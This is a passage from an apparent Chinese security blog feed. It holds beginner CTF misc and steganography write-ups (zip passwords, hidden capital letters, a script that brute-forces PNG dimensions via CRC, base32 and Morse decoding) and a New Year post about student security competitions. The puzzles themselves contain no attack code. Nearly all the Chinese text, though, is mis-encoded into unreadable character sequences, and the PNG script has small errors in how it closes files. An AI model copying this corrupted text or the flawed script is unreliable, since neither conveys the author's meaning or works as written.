href="#æ‚é¡¹4" class="headerlink" title="æ‚é¡¹4"></a>æ‚é¡¹4</h2><p>å°æ˜å¿ƒçˆ±çš„å›¾ç‰‡åœ¨å‹ç¼©åŒ…ä¸­ï¼Œå¯æ˜¯å°æ˜å¤œæ·±äººé™çš„æ—¶å€™ï¼Œå­¤æ•éš¾çœ ï¼Œæƒ³æ‰“å¼€å›¾ç‰‡æ’é£å¯‚å¯ï¼Œå¯æ˜¯å¿˜è®°äº†å¯†ç äº†ï¼Œå°ç±³ä¾ç¨€è®°å¾—9ä½çš„å¯†ç éƒ½æ˜¯æ•°å­—ï¼Œå‰3ä½æ˜¯372ï¼Œä½ èƒ½å¸®åŠ©å°æ˜å—ï¼Ÿ</p><p><img src="https://img-blog.csdnimg.cn/c55190da5503448b909fabca1ee1bbea.png" alt="img"></p><h2 id="æ‚é¡¹5"><a href="#æ‚é¡¹5" class="headerlink" title="æ‚é¡¹5"></a>æ‚é¡¹5</h2><p><img src="https://img-blog.csdnimg.cn/c08c09970ccb4fdf898678e4721bf790.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>winhexæ‰“å¼€ä¸€ä¸²å¥‡æ€ªçš„å­—</p><blockquote><p>i was always Fond of visiting new scenes, and observing strange characters and manners. even when a mere chiLd i began my travels, and made mAny tours of discovery into foreiGn {parts and unknown regions of my native City, to the frequent alarm of my parents, and The emolument of the town-crier. as i grew into boyhood, i extended the range oF my obServations. my holiday afternoons were spent in rambles about tHe surrounding cOuntry. i made myself familiar With all its places famous in history or fable. i kNew every spot where a murder or robbery had been committed, or a ghost seen. i visited the neighboring villages, and added greatly to my stock of knowledge,By noting their habits and customs, and conversing with their sages and great men.}</p></blockquote><p>å…ˆè¿›è¡Œä¸€æ‰‹ç™¾åº¦ç¿»è¯‘ã€‚æ¯«æ— å¤´ç»ªï¼Œå‘ç°è¿™é‡Œé¢å¤§å†™å­—æ¯ä¸å¯¹åŠ²ï¼Œç›´æ¥å¯¹å°å†™å­—æ¯è¿›è¡Œåˆ å‡ã€‚</p><p>FLAG{CTFSHOWNB}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">string = <span class="string">&#x27;i was always Fond of visiting new scenes, and observing strange characters and manners. even when a mere chiLd i began my travels, and made mAny tours of discovery into foreiGn &#123;parts and unknown regions of my native City, to the frequent alarm of my parents, and The emolument of the town-crier. as i grew into boyhood, i extended the range oF my obServations. my holiday afternoons were spent in rambles about tHe surrounding cOuntry. i made myself familiar With all its places famous in history or fable. i kNew every spot where a murder or robbery had been committed, or a ghost seen. i visited the neighboring villages, and added greatly to my stock of knowledge,By noting their habits and customs, and conversing with their sages and great men.&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(re.findall(<span class="string">r&#x27;[A-Z\&#123;\&#125;]&#x27;</span>,string))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é™„ä¸€ä¸ªå–å¤§å†™çš„ç¨‹åº</p><h2 id="æ‚é¡¹6"><a href="#æ‚é¡¹6" class="headerlink" title="æ‚é¡¹6"></a>æ‚é¡¹6</h2><blockquote><p>å°æ˜çš„å‹ç¼©åŒ…åˆå¿˜è®°å¯†ç äº†ï¼Ÿä»–å»ç”µè„‘ç»´ä¿®åº—å»ä¿®ï¼Œäººå®¶æ‰”å‡ºæ¥è¯´è¿™ä¸ªæ ¹æœ¬å°±æ²¡æœ‰å¯†ç ï¼Œæ˜¯ä¸ªå‡å¯†ç ã€‚å°æ˜æ‡µäº†ï¼Œæ˜æ˜æœ‰å¯†ç çš„å•Šï¼Œä½ èƒ½å¸®å¸®å°æ˜å—ï¼Ÿ</p></blockquote><p>æœ‰å¯†ç åˆæ²¡æœ‰å¯†ç ï¼Œè€è°œè¯­äººäº†</p><p>ç¦»è°±æ‰‹æœºç›´æ¥è§£å‹äº†</p><h2 id="æ‚é¡¹7"><a href="#æ‚é¡¹7" class="headerlink" title="æ‚é¡¹7"></a>æ‚é¡¹7</h2><blockquote><p>å°æ˜å°å¿ƒç¿¼ç¿¼çš„æ‰“å¼€å‹ç¼©åŒ…ï¼Œç«Ÿç„¶æ˜¯ä¸ªå›¾ç‰‡ï¼Œä»€ä¹ˆé¬¼ï¼Ÿ è¦æ˜¯å›¾ç‰‡èƒ½ç»§ç»­å¾€é•¿ä¸€ç‚¹è¯¥å¤šå¥½å•Šï¼Œå°æ˜æš—æš—çš„æƒ³ã€‚ ä½ èƒ½å¸®å°æ˜å®Œæˆè¿™ä¸ªæœ´ç´ çš„æ¢¦æƒ³å—ï¼Ÿ</p></blockquote><p>å›¾ç‰‡æ˜¯è¿™æ ·çš„ä¸€å¼ å›¾ã€‚</p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>åšé¢˜äººè¦ä¿æŒåº”æœ‰çš„å†·é™</p><p><img src="https://img-blog.csdnimg.cn/09673c830674477eabee584488314f2f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file = <span class="built_in">input</span>(<span class="string">&quot;å›¾ç‰‡åœ°å€ï¼š&quot;</span>)</span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data: <span class="built_in">bytearray</span> = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#åŸæ¥çš„ä»£ç : crc32key = eval(str(fr[29:33]).replace(&#x27;\\x&#x27;,&#x27;&#x27;).replace(&quot;1b&#x27;&quot;,&#x27;0x&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;))</span></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            file.close()</span><br></pre></td></tr></table></figure><h2 id="æ‚é¡¹8"><a href="#æ‚é¡¹8" class="headerlink" title="æ‚é¡¹8"></a>æ‚é¡¹8</h2><blockquote><p>å°æ˜çœ‹å®Œå›¾ç‰‡è€è„¸ä¸€çº¢ï¼Œå¿ƒæƒ³ï¼Œæˆ‘å¥³æœ‹å‹èƒ½æœ‰è¿™ä¹ˆç˜¦å°±å¥½äº†ã€‚</p></blockquote><p>éƒ½æ˜¯lspï¼</p><p>ä¸ä¸Šé¢˜ç±»ä¼¼è·‘<img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="æ‚é¡¹10"><a href="#æ‚é¡¹10" class="headerlink" title="æ‚é¡¹10"></a>æ‚é¡¹10</h2><p>ç¼©å°ä¸€çœ‹æ˜æ˜¾çš„æˆ‘å¥½å–œæ¬¢ä½                 </p><p><img src="https://img-blog.csdnimg.cn/da519d06e2774515bac5020f80645f69.png" alt="img" style="zoom: 25%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h2 id="æ‚é¡¹11"><a href="#æ‚é¡¹11" class="headerlink" title="æ‚é¡¹11"></a>æ‚é¡¹11</h2><p>å°†é¢˜ç›®ç”¨æ‰€ç»™å·¥å…·æ‰“å¼€ï¼Œç‚¹å‡»seekä¸éœ€è¦è¾“å…¥å¯†ç </p><p><img src="https://img-blog.csdnimg.cn/98b7cf0ff4114550882e096837d17f3a.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>ç›´æ¥ä¿å­˜ä¸ºpngå‘ç°æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œç”¨åœ¨çº¿è§£ç å™¨è§£ç </p><p><img src="https://img-blog.csdnimg.cn/c720db099b8f40649a93dc169550faf2.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>è§£å‡ºä¸€ä¸ªè¿™ä¸ªä¸œè¥¿ï¼Œæ˜æ˜¾çš„base64ï¼Œç›´æ¥è½¬ï¼Œæœç„¶flagå°± å‡ºæ¥äº†ã€‚</p><h2 id="éšå†™1"><a href="#éšå†™1" class="headerlink" title="éšå†™1"></a>éšå†™1</h2><p>æ‰“å¼€è¯´å›¾ç‰‡é”™è¯¯ï¼Œå…ˆæ‰”è¿›winhexé‡Œçœ‹çœ‹ï¼Œçœ‹è§ngï¼Œæƒ³æ˜¯ä¸æ˜¯pngå›¾ç‰‡ï¼Œç„¶åæŠŠå‰æŠŠä½ä»99æ”¹æˆ89ï¼Œä¿å­˜ã€‚</p><p>æœç„¶ï¼Œflagå°±å‡ºæ¥äº†ã€‚</p><h2 id="éšå†™2"><a href="#éšå†™2" class="headerlink" title="éšå†™2"></a>éšå†™2</h2><p>æ‰“å¼€å›¾ç‰‡å†™çš„JPNS</p><p>ä¸æ‚é¡¹11ç±»ä¼¼çš„æ“ä½œï¼Œç”šè‡³æ›´ç®€å•ã€‚</p><h2 id="èŒæ–°éšå†™5"><a href="#èŒæ–°éšå†™5" class="headerlink" title="èŒæ–°éšå†™5"></a>èŒæ–°éšå†™5</h2><p>ç™¾åº¦å‘Šè¯‰æˆ‘ï¼Œä»–å˜´é‡Œå¿µå¨çš„æ˜¯è¿™ä¸ªä¸œè¥¿ã€‚</p><p><img src="https://img-blog.csdnimg.cn/26ef229846894c29b6b563279a4e064a.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">è½¬æ¢å®Œæ˜¯è¿™ä¸ª</p><blockquote><p>\u4d00\u5a00\u5700\u4700\u4300\u5a00\u5a00\u4900\u4e00\u4200\u5100\u5700\u3600\u5800\u3300\u4b00\u4e00\u4600\u3200\u5600\u3600\u5900\u5400\u5600\u4c00\u3500\u3400\u5700\u3600\u3300\u5400\u4800\u4c00\u3500\u5200\u4400\u4700\u4d00\u5300\u3700\u4600\u4500\u3d00\u3d00\u3d00\u3d00\u3d00\u3d00</p></blockquote><p>è¿˜ç‰¹æ„æŸ¥äº†æŸ¥ï¼Œä»–ä»¬ä¹‹é—´çš„åŒºåˆ«</p><p>\uåˆ™ä»£è¡¨unicodeç¼–ç ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ï¼›<br>0xå¼€å¤´ä»£è¡¨åå…­è¿›åˆ¶ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæ•´æ•°ï¼›<br>\xå¯¹åº”çš„æ˜¯UTF-8ç¼–ç çš„æ•°æ®ï¼Œé€šè¿‡è½¬åŒ–è§„åˆ™å¯ä»¥è½¬æ¢ä¸ºUnicodeç¼–ç ï¼Œå°±èƒ½å¾—åˆ°å¯¹åº”çš„æ±‰å­—ï¼Œè½¬æ¢è§„åˆ™å¾ˆç®€å•ï¼Œå…ˆå°†\xå»æ‰ï¼Œè½¬æ¢ä¸ºæ•°å­—;</p><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦</p><p><img src="https://img-blog.csdnimg.cn/eb52512c495f4742a5ade43ea6217ba2.png" alt="img" style="zoom:50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</span><br></pre></td></tr></table></figure></blockquote><p>åªæœ‰å¤§å†™å’Œæ•°å­—æ˜æ˜¾çš„base32</p><p><img src="https://img-blog.csdnimg.cn/0760a477394e4c6d973f3b5c4ceecb2a.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>é•¿çŸ­é•¿çŸ­ï¼Œé¦–å…ˆè€ƒè™‘æ‘©æ–¯å¯†ç ï¼Œé•¿çš„ç”¨-ï¼Œæ®µçš„ç”¨.</p><blockquote><p>â€“ ..- â€“.. .. -.- .. â€¦ â€“. â€”â€“ â€”â€“ -..</p></blockquote><p>MUZIKISG00D</p><p>è‡³æ­¤èŒæ–°é¢˜ä¸Šç¯‡å¤§ä¸æºœçš®ä¹¦å†™å®Œæ¯•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;èŒæ–°é¢˜wp-ä¸Šç¯‡&quot;&gt;&lt;a href=&quot;#èŒæ–°é¢˜wp-ä¸Šç¯‡&quot; class=&quot;headerlink&quot; title=&quot;èŒæ–°é¢˜wp(ä¸Šç¯‡)&quot;&gt;&lt;/a&gt;èŒæ–°é¢˜wp(ä¸Šç¯‡)&lt;/h1&gt;&lt;p&gt;å†™ä¸€æ‰‹èŒæ–°é¢˜æƒå½“æ‘¸é±¼äº†&lt;/p&gt;
&lt;h2 id=&quot;èŒæ–°-å¯†ç 1&quot;&gt;&lt;a href=&quot;#èŒæ–°</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>æ–°å¹´å¿«ä¹</title>
    <link href="http://websec.space/2022/01/01/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/"/>
    <id>http://websec.space/2022/01/01/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/</id>
    <published>2021-12-31T16:00:00.000Z</published>
    <updated>2021-12-31T18:17:18.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–°å¹´å¿«ä¹"><a href="#æ–°å¹´å¿«ä¹" class="headerlink" title="æ–°å¹´å¿«ä¹"></a>æ–°å¹´å¿«ä¹</h1><p>æ–°çš„ä¸€å¹´ï¼Œæ›´åŠ åŠªåŠ›ä¸åšæŒï¼Œæ›´åŠ çµæ´»ï¼Œä¸æ–­å‘å‰ï¼ŒåŠ æ²¹å§ï¼</p><p>ä»Šå¹´æ˜¯æˆ‘åœ¨å®‰å…¨é¢†åŸŸçš„ç¬¬ä¸€å¹´ï¼Œå›æƒ³è¿‡å»ä¸€å¹´æ‰€ç»å†çš„æ¯”èµ›ï¼Œä»¿ä½›éƒ½å†å†åœ¨ç›®ï¼Œæœ¬æƒ³å½’çº³è®°å½•ä¸€ä¸‹ï¼Œå¥ˆä½•å¤ªæ‡’äº†ï¼Œä»Šå¤©æ˜¯2020.01.01ï¼Œé¦–å…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹å–ï¼</p><p>ç°åœ¨æ¥ç›˜ç‚¹è®°å½•ä¸€ä¸‹ä»Šå¹´åœ¨å®‰å…¨é¢†åŸŸæ‰€ç»å†çš„æ¯”è¾ƒè®°å¿†çŠ¹æ–°çš„äº‹æƒ…ï¼Œä¹Ÿæ„Ÿè°¢å„ä½åœ¨è¿™æ¡è·¯ä¸Šä¸€ç›´å¸®åŠ©æˆ‘çš„è€å¸ˆå’ŒåŒå­¦ï¼Œæ–°çš„ä¸€å¹´ï¼Œå¤§å®¶ç»§ç»­åŠªåŠ›ã€‚</p><h2 id="2021å¹´å¯’å‡çº¿ä¸Šå®è®­"><a href="#2021å¹´å¯’å‡çº¿ä¸Šå®è®­" class="headerlink" title="2021å¹´å¯’å‡çº¿ä¸Šå®è®­"></a>2021å¹´å¯’å‡çº¿ä¸Šå®è®­</h2><p>ç»“è¯†äº†æ¨è€å¸ˆï¼Œå¹¶ä¸”åœ¨è€å¸ˆçš„æŒ‡å¯¼ä¸‹ï¼Œå¼€å§‹äº†åœ¨æš—ç½‘æ–¹é¢çš„ç›¸å…³ç ”ç©¶å·¥ä½œã€‚</p><h2 id="ciscnä½œå“èµ›"><a href="#ciscnä½œå“èµ›" class="headerlink" title="ciscnä½œå“èµ›"></a>ciscnä½œå“èµ›</h2><p>ç¬¬ä¸€æ¬¡å‚åŠ å›½èµ›ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡åšå®‰å…¨ç ”å‘ï¼Œå¤§ä¸€ä¸Šä¸»è¦å‚åŠ ä¸¤ä¸ªæ¯”èµ›ï¼Œç¬¬ä¸€æ¬¡å‚èµ›ï¼Œä¹Ÿæ˜¯è¯¯æ‰“è¯¯æ’å°±è¿›äº†å†³èµ›ï¼Œç»§ç»­å‡†å¤‡è°ƒè¯•ï¼Œåšäº†è®¸å¤šéï¼Œåœ¨å³å°†å¯ç¨‹å‡ºå‘é’å²›å‚åŠ å†³èµ›æ—¶ï¼Œç–«æƒ…åå¤ï¼Œåœ¨å‡ºå‘çš„å‰ä¸€å¤©æ¯”èµ›å–æ¶ˆäº†ï¼Œæ¨è¿Ÿï¼ˆä»Šå¹´å¯èƒ½ä»¤è®¸å¤šå®‰å…¨å‚èµ›åŒå­¦æœ€æ— å¥ˆçš„å°±æ˜¯ç–«æƒ…å§ï¼‰ã€‚</p><p>åœ¨æš‘å‡è¿‡å»ä¸€åŠçš„æ—¶å€™è‰è‰å›å®¶ï¼Œç­‰å¾…æ¯”èµ›çš„æ—¶æœŸ</p><img src="https://img-blog.csdnimg.cn/4744627185fc453da9f64e94ac8ccce7.png" alt="img" style="zoom: 33%;" /><p>æœ€åè¢«åˆ†åˆ°æ€»ä½“åšçš„è¿˜ç®—æ¯”è¾ƒæ»¡æ„ï¼Œæœ€åç³»ç»Ÿä¹Ÿå®ç°äº†ï¼Œç­”è¾©ä¹Ÿå›ç­”äº†è€å¸ˆä»¬çš„é—®é¢˜ã€‚</p><img src="https://img-blog.csdnimg.cn/2b9e6b0d1a784965aab91b002815c2f7.png" alt="img" style="zoom:50%;" /><h2 id="å°–å³°è®­ç»ƒè¥"><a href="#å°–å³°è®­ç»ƒè¥" class="headerlink" title="å°–å³°è®­ç»ƒè¥"></a>å°–å³°è®­ç»ƒè¥</h2><p>2021å¹´å¼€å§‹ç«‹é¡¹çš„ç¬¬ä¸€ä¸ªé¡¹ç›®ï¼Œä¹Ÿæ˜¯è®©æˆ‘ç»å†ä»ä¸€ä¸ªå°ç™½åˆ°çœŸæ­£å…¥é—¨çš„ç¬¬ä¸€ä¸ªé¡¹ç›®ï¼Œè§è¯äº†å¼€å‘ä¸€ä¸ªå®‰å…¨äº§å“çš„å…¨è¿‡ç¨‹ã€‚</p><p>é™„ä¸€å¼ å†³èµ›æ—¶çš„å›¾ç‰‡ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å‡ºå»æ‰“æ¯”èµ›ï¼Œæ­¦æ±‰å¾ˆçˆ±ã€‚</p><img src="https://img-blog.csdnimg.cn/284eb45e8486456cb5eff823deeb022d.png" alt="img" style="zoom: 50%;" /><img src="https://img-blog.csdnimg.cn/7ad5ef24b98342d9b0bf88ca599c49e5.png" alt="img" style="zoom:50%;" /><p>å¾…é‡ä¹Ÿå¾ˆçˆ±ï¼Œå®¾é¦†å¾ˆå¥½ï¼Œæ—©é¤ä¹Ÿå¾ˆçˆ±ã€‚</p><img src="https://img-blog.csdnimg.cn/3f35b6b70af648208025f0d98b78c6d7.png" alt="img" style="zoom:50%;" /><p><img src="https://img-blog.csdnimg.cn/15582233adfc4b76a27eb09d95ca967d.png" alt="img"></p><img src="https://img-blog.csdnimg.cn/f4e424b644f647f78ca050074fe2137a.png" alt="img" style="zoom:50%;" /><p>æœ€åæ‹¿åˆ°äº†å›¢é˜Ÿèµ›äºŒç­‰å¥–ï¼Œå‰å››çš„æˆç»©å“ˆå“ˆå“ˆï¼Œä¹Ÿç®—è®©è‡ªå·±åœ¨å®‰å…¨é¢†åŸŸæ…¢æ…¢å»ºç«‹èµ·äº†ä¿¡å¿ƒã€‚</p><img src="https://img-blog.csdnimg.cn/6af1f74ad56245fe8c46dbd092650bad.png" alt="img" style="zoom:50%;" /><p>æ„Ÿè°¢è€å¸ˆä»¬çš„æ”¯æŒï¼Œä¹Ÿæ„Ÿè°¢æ´å“¥æ­¤å¤„@breyåœ¨å…³é”®æ—¶åˆ»æä¾›çš„æ”¯æŒï¼Œå¤šå°‘æ¬¡æ„Ÿè§‰è¦æ”¾å¼ƒæ—¶ï¼Œæ´å“¥çš„å…³é”®å»ºè®®æ€»èƒ½æˆä¸ºä¸æ–­æ¨è¿›çš„å¯è¡Œæ–¹æ¡ˆã€‚</p><p>ä¹Ÿç¬¬ä¸€æ¬¡æ¥è§¦äº†é¾™èŠ¯ï¼Œä¹Ÿåšäº†ä¸€äº›æ¯”è¾ƒåˆ›æ–°çš„å°æ“ä½œï¼Œæƒ³æƒ³è¿˜æ˜¯è›®æœ‰è¶£çš„ã€‚</p><h2 id="ç½‘ç»œè¿ç»´çº³æ–°"><a href="#ç½‘ç»œè¿ç»´çº³æ–°" class="headerlink" title="ç½‘ç»œè¿ç»´çº³æ–°"></a>ç½‘ç»œè¿ç»´çº³æ–°</h2><p>å¯èƒ½å¤§å­¦éƒ½æœ‰é‚£ä¹ˆå‡ ä¸ªåœ°æ–¹ï¼Œæœ‰ä¸€å¸®å¿—åŒé“åˆçš„æœ‹å‹ï¼Œåˆåˆ°äº†ä¸€å¹´çš„å¼€å­¦å­£ï¼Œç½‘ç»œè¿ç»´å¼€å§‹çº³æ–°ï¼Œå‡†å¤‡å¾ˆå¤šå“ˆå“ˆ</p><p>çœ‹åˆ°äº†å½¢å½¢è‰²è‰²çš„æ–°åŒå­¦ï¼Œæœ‰æ—¶å€™ä¹Ÿæ„Ÿæ…¨è‡ªå·±æŠ€æœ¯å¥½èœï¼Œä¸åŠå¾ˆå¤šå¤§ä¸€çš„åŒå­¦ï¼Œå¿™å¿™ç¢Œç¢Œä¸¤ä¸ªæœˆç½‘ç»œè¿ç»´ä¹Ÿç®—å®Œæˆæ–°çš„ä¸€å¹´çš„ç»„å»ºã€‚</p><img src="https://img-blog.csdnimg.cn/a861529fd77c4571bd9fb5f601e7e8bd.png" alt="img" style="zoom:33%;" /><h2 id="ç©¹é•œSkyMirroræˆç«‹"><a href="#ç©¹é•œSkyMirroræˆç«‹" class="headerlink" title="ç©¹é•œSkyMirroræˆç«‹"></a>ç©¹é•œSkyMirroræˆç«‹</h2><p>é©¬å·¥çš„æ¨èä¸‹ï¼Œæ­£å¼ä»¥ç©¹é•œSkyMirrorï¼Œç©¹é•œçš„æˆç«‹ä¹Ÿå½¢æˆå·¥å¤§åˆä¸€ä¸ªå´­æ–°çš„å®‰å…¨åœˆå­ï¼Œæ­£å¦‚åœ¨ç»„å»ºçš„æ—¶å€™æ‰€è¯´ï¼Œç©¹é•œå®‰å…¨æ‰€å±•å¼€çš„é¢å¾ˆå¹¿ï¼ŒæŒ‰ç…§å¤§å®¶å…´è¶£å»åšè‡ªå·±çš„æ–¹å‘ï¼Œæ–°çš„ä¸€å¹´ç©¹é•œåŠ æ²¹ã€‚</p><p>ï¼ˆå®‰å…¨ç»„:æƒ³åœ¨äº’è”ç½‘ä¸Šæˆä¸ºä¸€åæ¼æ´çŒäººå—,æƒ³ä¸ºæ‰“å‡»äº’è”ç½‘é»‘äº§å¥‰çŒ®ä¸€ä»½åŠ›é‡å—,æƒ³æˆä¸ºä¸€åå¸…æ°”çš„ CTFer å—?æˆ‘ä»¬æœ‰å¥‹æ–—äºå®‰å…¨ä¸€çº¿çš„ Hacker ,æˆ–ç—´è¿·ç”¨ä»£ç æ”¹å˜ä¸–ç•Œ Programmer ,äº¦ä¸ä¹æ½œå¿ƒé’»ç ”çš„ Geeker ã€‚æˆ‘ä»¬å§‹ç»ˆä¸å®‰ä¸€å¶,å´‡å°šæŠ€æœ¯,ä¸æ–­åœ¨ä¿¡æ¯å®‰å…¨çš„ä¼ ç»Ÿç•Œçº¿ä¸Šå¯»æ±‚æŒ‘æˆ˜å’Œçªç ´ã€‚åœ¨è¿™é‡Œæœ‰å’±ä»¬è¿ç»´éƒ¨é—¨çš„å®‰å…¨å·¥ç¨‹å¸ˆ,ä¹Ÿæœ‰ä¸æ–­åŠªåŠ›å­¦ä¹ çš„å­¦é•¿,åŠ å…¥æˆ‘ä»¬,å…±åŒåŠªåŠ›,å¤§å®¶ä¸€èµ·å˜å¾—æ›´å¼ºã€‚ï¼‰</p><h2 id="ç¾äºšæ¯â€ç¬¬ä¸ƒå±Šä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›"><a href="#ç¾äºšæ¯â€ç¬¬ä¸ƒå±Šä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›" class="headerlink" title="ç¾äºšæ¯â€ç¬¬ä¸ƒå±Šä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›"></a>ç¾äºšæ¯â€ç¬¬ä¸ƒå±Šä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›</h2><p>è¢«ç™¾åº¦äº‘å’Œç¡¬ç›˜æå¿ƒæ€çš„ä¸€ä¸ªæ¯”èµ›ï¼Œä¹Ÿç®—æ˜¯ç©¹é•œåœ¨ç»„å»ºä»¥åå¤§å®¶å‚åŠ çš„ç¬¬ä¸€ä¸ªæ¯”èµ›ã€‚</p><p>æœ‰æ—¶å€™ä¸‹è½½ä¸€ä¸ªæ™šä¸Šç¬¬äºŒå¤©å‘ç°</p><img src="https://img-blog.csdnimg.cn/7a6e6031283a496989bc3580db9ce2ea.png" alt="img" style="zoom:33%;" /><p>ç½‘ä¸è¡Œå°±ä¸Šåƒå…†ç½‘ï¼Œç›˜ä¸è¡Œå°±åŠ ç›˜</p><img src="https://img-blog.csdnimg.cn/52e23ef0990c46118d185edfa7f5235c.png" alt="img" style="zoom: 33%;" 